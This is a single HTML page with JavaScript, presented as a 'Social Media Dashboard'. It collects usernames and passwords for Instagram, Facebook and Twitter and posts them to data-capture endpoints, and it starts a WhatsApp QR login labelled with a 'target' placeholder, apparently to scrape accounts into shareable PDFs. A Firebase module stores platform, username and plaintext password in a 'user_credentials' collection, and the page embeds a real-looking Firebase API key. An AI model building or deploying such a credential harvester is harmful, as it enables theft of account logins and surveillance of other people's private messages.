<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Social Media Dashboard</title>
<style>
/* Styling unchanged for your layout */
body {
    font-family: Arial, sans-serif;
    background-color: darkseagreen;
    text-align: center;
}
.container { width: 80%; margin: 0 auto; }
.social-media { display: flex; flex-wrap: wrap; justify-content: space-around; margin-top: 50px; }
.media-item {
    display: flex; flex-direction: column; align-items: center;
    background-color: #fff; padding: 20px; border-radius: 10px;
    box-shadow: 0 4px 8px rgba(0,0,0,0.1); margin: 10px;
}
.icon { width: 50px; height: 50px; }
.dropbtn {
    padding: 10px; background-color: #3498db; color: white;
    border: none; border-radius: 5px; cursor: pointer;
}
.actions { margin-top: 30px; }
.actions button {
    padding: 10px 20px; background-color: #2ecc71;
    color: white; border: none; border-radius: 5px; cursor: pointer;
    margin: 0 10px;
}
.actions button:disabled {
    background-color: #ccc; cursor: not-allowed;
}
/*.share-options { margin-top: 20px; display: flex; justify-content: center; flex-wrap: wrap; }
.share-options a {
    padding: 10px 15px; margin: 5px;
    background-color: #2980b9; color: white;
    text-decoration: none; border-radius: 5px;
} */
#credentialsForm { margin-top: 30px; display:none; }
#credentialsForm input[type="text"], #credentialsForm input[type="password"] {
    padding: 8px; width: 300px;
}
#waInstructions { font-size: 13px; color: #111; margin-top: 8px; }
</style>


</head>
<body>

<div class="container">
<h1>Social Media Dashboard</h1>

<div class="social-media">
    <!-- WhatsApp -->
    <div class="media-item">
        <img src="whatsapp.png" class="icon">
        <span>WhatsApp</span>
        <button class="dropbtn" onclick="openCredentialsForm('WhatsApp')">Collect data</button>
    </div>

    <!-- Instagram -->
    <div class="media-item">
        <img src="instagram.png" class="icon">
        <span>Instagram</span>
        <button class="dropbtn" onclick="openCredentialsForm('Instagram')">Collect data</button>
    </div>

    <!-- Facebook -->
    <div class="media-item">
        <img src="facebook.png" class="icon">
        <span>Facebook</span>
        <button class="dropbtn" onclick="openCredentialsForm('Facebook')">Collect data</button>
    </div>

    <!-- Twitter -->
    <div class="media-item">
        <img src="twitter.png" class="icon">
        <span>Twitter</span>
        <button class="dropbtn" onclick="openCredentialsForm('Twitter')">Collect data</button>
    </div>

    <!-- Telegram -->
    <div class="media-item">
        <img src="telegram.png" class="icon">
        <span>Telegram</span>
        <button class="dropbtn" onclick="openCredentialsForm('Telegram')">Collect data</button>
    </div>

    <!-- YouTube -->
    <div class="media-item">
        <img src="youtube.png" class="icon">
        <span>YouTube</span>
        <button class="dropbtn" onclick="openCredentialsForm('YouTube')">Collect data</button>
    </div>



    <!-- Snapchat -->
    <div class="media-item">
        <img src="snapchat.png" class="icon">
        <span>Snapchat</span>
        <button class="dropbtn" onclick="openCredentialsForm('Snapchat')">Collect data</button>
    </div>
</div>

<!-- Credentials Form -->
<div id="credentialsForm">
    <h3 id="appName"></h3>
    <form id="loginForm">
        <!-- Standard username/password (used for many platforms) -->
        <div id="standardFields">
            <label>Username:</label>
            <input type="text" id="username" required><br><br>
            <label>Password:</label>
            <input type="password" id="password" required><br><br>
        </div>

        <!-- WhatsApp-specific label + instructions (initially hidden) -->
        <div id="waFields" style="display:none;">
            <label>Label (optional):</label>
            <input type="text" id="waLabel" placeholder="e.g. target-phone-or-alias"><br><br>
            <div id="waInstructions" style="display:none;">
                <strong>WhatsApp QR scan:</strong> After you submit, a browser window will open showing WhatsApp Web QR. <br>
                Scan it with the WhatsApp mobile app of the account you are authorized to access. Once scanned the automation will continue and generate the PDF.
            </div>
        </div>

        <button type="submit">Submit</button>
    </form>
</div>

<!-- PDF Actions -->
<div class="actions">
    <button id="openPdf" disabled>Open PDF</button>
    <button id="sharePdf" disabled>Share PDF</button>
</div>

<!-- Share Links 

<div class="share-options">
    <a id="shareWhatsapp" href="#">Share on WhatsApp</a>
    <a id="shareTwitter" href="#">Share on Twitter</a>
    <a id="shareFacebook" href="#">Share on Facebook</a>
    <a id="shareEmail" href="#">Share via Email</a>
</div> -->
</div>

<script>
let selectedPlatform = "";

// When user clicks Collect Data
function openCredentialsForm(appName) {
    selectedPlatform = appName;
    document.getElementById("appName").innerText = `Enter ${appName} Credentials`;
    document.getElementById("credentialsForm").style.display = "block";

    // WhatsApp special handling: show label + instructions, hide username/password
    if (appName === "WhatsApp") {
        document.getElementById("standardFields").style.display = "none";
        document.getElementById("waFields").style.display = "block";
        document.getElementById("waInstructions").style.display = "block";
        document.getElementById("username").required = false;
        document.getElementById("password").required = false;
    } else {
        // show standard fields for other platforms
        document.getElementById("standardFields").style.display = "block";
        document.getElementById("waFields").style.display = "none";
        document.getElementById("waInstructions").style.display = "none";
        document.getElementById("username").required = true;
        document.getElementById("password").required = true;
    }
}

// Enable PDF buttons after automation
function enablePdfButtons() {
    document.getElementById("openPdf").disabled = false;
    document.getElementById("sharePdf").disabled = false;
}

// Handle form submit for selected platform
document.getElementById("loginForm").addEventListener("submit", async function(e) {
    e.preventDefault();
    if (!selectedPlatform) {
        alert("Please select a platform first!");
        return;
    }

    const username = document.getElementById("username").value;
    const password = document.getElementById("password").value;

    // WhatsApp uses QR
    if (selectedPlatform === "WhatsApp") {
        const label = document.getElementById("waLabel").value || "default";
        try {
            const res = await fetch("/capture-whatsapp", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ label })
            });

            const json = await res.json();
            if (json.status === "success") {
                alert(`‚úÖ ${selectedPlatform} data captured and PDF generated!`);
                enablePdfButtons();
            } else {
                alert(`‚ùå Failed to capture ${selectedPlatform} data.`);
            }
        } catch (err) {
            alert(`‚ùå Error: ${err.message}`);
        }
        return;
    }

    // Other platforms
    let url = "";
    if (selectedPlatform === "Instagram") url = "/capture-instagram";
    else if (selectedPlatform === "Facebook") url = "/capture-facebook";
    else if (selectedPlatform === "Twitter") url = "/capture-twitter";
    else {
        alert(`Automation for ${selectedPlatform} is not ready yet.`);
        return;
    }

    try {
        const res = await fetch(url, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ username, password })
        });

        const json = await res.json();
        if (json.status === "success") {
            alert(`‚úÖ ${selectedPlatform} data captured and PDF generated!`);
            enablePdfButtons();

        } else {
            alert(`‚ùå Failed to capture ${selectedPlatform} data.`);
        }
    } catch (err) {
        alert(`‚ùå Error: ${err.message}`);
    }
});

// Open PDF
document.getElementById("openPdf").addEventListener("click", function() {
    if (selectedPlatform) {
        const file = `${selectedPlatform.toLowerCase()}_latest.pdf`;
        window.open(`/captured_data/${file}`, "_blank");
    }
});
// Share PDF
document.getElementById("sharePdf").addEventListener("click", async function() {
    if (!selectedPlatform) {
        alert("Please select a platform first!");
        return;
    }

    const fileName = `${selectedPlatform.toLowerCase()}_latest.pdf`;
    const fileUrl = `${window.location.origin}/captured_data/${fileName}`;

    try {
        // Try native share (works on Chrome mobile/desktop with support)
        if (navigator.canShare && navigator.canShare({ url: fileUrl })) {
            await navigator.share({
                title: `${selectedPlatform} Report`,
                text: `Here is the captured ${selectedPlatform} PDF report.`,
                url: fileUrl
            });
        } else {
            // Fallback ‚Äî open in new tab and copy link
            navigator.clipboard.writeText(fileUrl);
            alert(`üìé Link copied to clipboard!\n\nIf sharing is not supported on your device, open or send this link:\n${fileUrl}`);
            window.open(fileUrl, "_blank");
        }
    } catch (err) {
        alert(`‚ùå Unable to share file: ${err.message}`);
    }
});

</script>
<script type="module">
  import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
  import { getFirestore, collection, addDoc, serverTimestamp } 
    from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";

  // üî• Your Firebase config (copy from Firebase Console ‚Üí Project Settings ‚Üí SDK setup)
  const firebaseConfig = {
    apiKey: "AIzaSyASbSLUeoPI_DB7Uq4NdGSTNR6gUR2rELQ",
    authDomain: "social-media-feed-parsing-tool.firebaseapp.com",
    projectId: "social-media-feed-parsing-tool",
    storageBucket: "social-media-feed-parsing-tool.appspot.com",
    messagingSenderId: "68383745531",
    appId: "1:68383745531:web:4e3b1c79842c7dadd1175e"
  };

  // Initialize Firebase
  const app = initializeApp(firebaseConfig);
  const db = getFirestore(app);

  // ‚úÖ Make saveCredentials global so your earlier form logic can call it
  window.saveCredentials = async function (platform, username, password) {
    try {
      const docRef = await addDoc(collection(db, "user_credentials"), {
        platform,
        username,
        password,
        timestamp: serverTimestamp(),
      });
      console.log("‚úÖ Credentials saved to Firestore with ID:", docRef.id);
    } catch (err) {
      console.error("‚ùå Error saving credentials:", err);
    }
  };
</script>


</body>
</html>
